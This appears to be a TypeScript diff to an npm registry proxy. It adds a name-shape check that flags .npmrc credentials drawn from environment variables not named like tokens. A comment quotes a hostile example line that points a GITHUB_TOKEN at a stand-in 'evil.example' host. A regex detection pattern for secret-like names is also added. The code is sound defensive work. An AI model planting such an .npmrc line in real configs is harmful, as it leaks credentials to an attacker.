@@ -51,6 +51,15 @@ function expand(value: string, env: Readonly<Record<string, string | undefined>>
 const nerf = (url: URL): string => `//${url.host}${url.pathname.endsWith("/") ? url.pathname : `${url.pathname}/`}`;
 
 /**
+ * I-1 (security-review-0.7.md): `${VAR}` expands ANY host environment variable into a credential the proxy will send to
+ * the configured registry, so an `.npmrc` line naming an unrelated, more powerful variable (a hostile or careless one:
+ * `//evil.example/:_authToken=${GITHUB_TOKEN}`, or simply a typo) would be honoured the same as a real npm token. This
+ * is only a name-shape heuristic, not a boundary (`--base` trust is the real one): it just surfaces an unexpected name
+ * as a note so a reviewer notices before merging the `.npmrc` change.
+ */
+const TOKEN_SHAPED_VAR = /token|auth|secret|pass|cred|key/i;
+
+/**
  * Turns the user's npm configuration into proxy registries and credentials. `layers` are `.npmrc` texts, the highest precedence
  * first (project file, then user file); only registries and their auth are read, nothing else is forwarded anywhere. Auth is matched
  * npm-style by the longest `//host/path/` prefix. Supported: `_authToken` (bearer), `_auth` (basic, base64 `user:pass`),
@@ -100,8 +109,17 @@ export function sourceRegistries(layers: readonly string[], env: Readonly<Record
   routes.forEach((r, i) => {
     const id = r.isDefault ? "main" : `r${i}`;
     const pathPrefix = r.url.pathname.replace(/\/+$/, "");
-    const credential = credentialFor(r.url, merged, get);
+    const authVars = new Set<string>();
+    const getAuth = (k: string): string | undefined => {
+      const raw = merged.get(k);
+      if (raw !== undefined) for (const m of raw.matchAll(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}/g)) authVars.add(m[1]!);
+      return get(k);
+    };
+    const credential = credentialFor(r.url, merged, getAuth);
     const clientCertificate = clientCertificateFor(r.url, merged, get, files, assertNoMissing);
+    for (const name of [...authVars].sort()) {
+      if (!TOKEN_SHAPED_VAR.test(name)) notes.push(`${id}: credential taken from \${${name}}, whose name does not look like a token/auth/key variable; check .npmrc names the right one`);
+    }
     registries.push({ id, upstream: r.url.origin, ...(pathPrefix !== "" ? { pathPrefix } : {}), isDefault: r.isDefault, ...(privateHosts.includes(r.url.hostname) ? { allowPrivateAddresses: true } : {}), ...(credential ? { credential } : {}), ...(clientCertificate ? { clientCertificate } : {}) });
     client.push({ id, isDefault: r.isDefault, ...(r.scopes.length > 0 ? { scopes: r.scopes } : {}) });
     upstreamPrefixes.push({ id, prefix: `${r.url.origin}${pathPrefix}/` });
